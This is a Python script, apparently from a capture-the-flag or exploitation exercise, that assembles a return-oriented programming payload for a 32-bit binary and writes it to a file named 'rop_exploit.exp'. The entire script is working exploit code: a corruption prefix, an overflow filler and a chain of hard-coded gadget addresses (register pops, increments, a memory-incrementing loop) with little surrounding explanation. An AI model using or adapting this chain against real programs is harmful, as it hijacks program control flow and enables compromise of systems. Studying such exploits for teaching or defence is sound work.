corrupt_input=b"S"*12+b"CC8"

overflow=b"a\ni\nG\na\nn\ne\ns\nh\na\n"+0x486*b"1\n"+b"A\nB\nC\nD\n"+b"\x6c\n\xa0\n\x0e\n\x08\n"

# 0x08048480(0x080EA078)
# G1 : pop edi ; ret
step_0=b"\x80\n\x84\n\x04\n\x08\n"+b"\x78\n\xa0\n\x0e\n\x08\n"

# 0x08049533
# G2 : xor eax, eax; ret
step_1=b"\x33\n\x95\n\x04\n\x08\n"

# 0x0807abaf
# G3 : inc eax; ret
step_2=b"\xaf\n\xab\n\x07\n\x08\n"

# 0x080dec61(0x080eba20)
# G4 : pop ecx ; ret
step_3=b"\x61\n\xec\n\x0d\n\x08\n"+b"\x20\n\xba\n\x0e\n\x08\n"

# 0x08084818
# G5 : inc dword ptr [ecx] ; ret
step_4=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
# G6 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
step_5=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"

# 0x08084818
# G5 : inc dword ptr [ecx] ; ret
step_6=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
# G6 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
step_7=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"

# 0x08084818
# G5 : inc dword ptr [ecx] ; ret
step_8=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
# G6 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
step_9=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"

# 0x08084818
# G5 : inc dword ptr [ecx] ; ret
step_10=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
# G6 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
step_11=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"

# 0x08084818
# G5 : inc dword ptr [ecx] ; ret
step_12=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
# G6 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
step_13=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"

# 0x08084818
# G5 : inc dword ptr [ecx] ; ret
step_14=b"\x18\n\x48\n\x08\n\x08\n"
# 0x080632c7(dummy)
# G6 : imul byte ptr [ecx] ; rcr byte ptr [edi + 0x5e], 1 ; pop ebx ; ret
step_15=b"\xc7\n\x32\n\x06\n\x08\n"+b"A\nA\nA\nA\n"

# 0x080489a5
# G7 : push eax
step_16=b"\xa5\n\x89\n\x04\n\x08\n"

# Printing Name properly
step_17=b"1"*12+b"\x09\x00\x00\x00\x00\n1\n"

# payload=corrupt_i+overflow+step_0+step_1+step_2+step_3+step_4+step_5+step_6+step_7+step_8+step_9+step_10+step_11+step_12+step_13+step_14+step_15+step_16+step_17+step_18+step_19
payload=corrupt_input+overflow+step_0+step_1+step_2+step_3+step_4+step_5+step_6+step_7+step_8+step_9+step_10+step_11+step_12+step_13+step_14+step_15+step_16+step_17

exp_file_name="rop_exploit.exp"
exp_out = open(exp_file_name,'wb')
exp_out.write(payload)
exp_out.close()